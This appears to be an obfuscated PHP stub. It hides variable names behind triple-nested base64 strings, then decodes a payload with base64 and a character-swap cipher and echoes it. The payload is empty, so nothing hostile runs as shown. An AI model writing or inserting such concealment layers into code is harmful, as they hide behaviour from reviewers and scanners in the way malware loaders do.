<?${base64_decode(base64_decode(base64_decode('VWpCNFVGRnJSazFWZHowOQ==')))}[base64_decode(base64_decode(base64_decode('WkVkb05tTlliSFZsYlRsdVdtNUtOV1J1YkdwalZqazFaRWRrTkdOUlBUMD0=')))]=base64_decode(base64_decode(base64_decode('V0RCWlBRPT0=')));${base64_decode(base64_decode(base64_decode('VWpCNFVGRnJSazFWZHowOQ==')))}[base64_decode(base64_decode(base64_decode('WWpKYWMySnRSbnBoTW5oM1dETmFiV05XT1dwWlZqbDZZbGRrY0dNemNHNVlkejA5')))]=base64_decode(base64_decode(base64_decode('V0RGblBRPT0=')));${${base64_decode(base64_decode(base64_decode('VWpCNFVGRnJSazFWZHowOQ==')))}[base64_decode(base64_decode(base64_decode('WkVkb05tTlliSFZsYlRsdVdtNUtOV1J1YkdwalZqazFaRWRrTkdOUlBUMD0=')))]}=__FILE__;${${base64_decode(base64_decode(base64_decode('VWpCNFVGRnJSazFWZHowOQ==')))}[base64_decode(base64_decode(base64_decode('WWpKYWMySnRSbnBoTW5oM1dETmFiV05XT1dwWlZqbDZZbGRrY0dNemNHNVlkejA5')))]}=base64_decode(base64_decode(base64_decode('')));
$_X=base64_decode($_X);$_X=strtr($_X,'123456aouie','aouie123456');$_R=str_replace('__FILE__',"'".$_F."'",$_X);echo($_R);$_R=0;$_X=0;
?>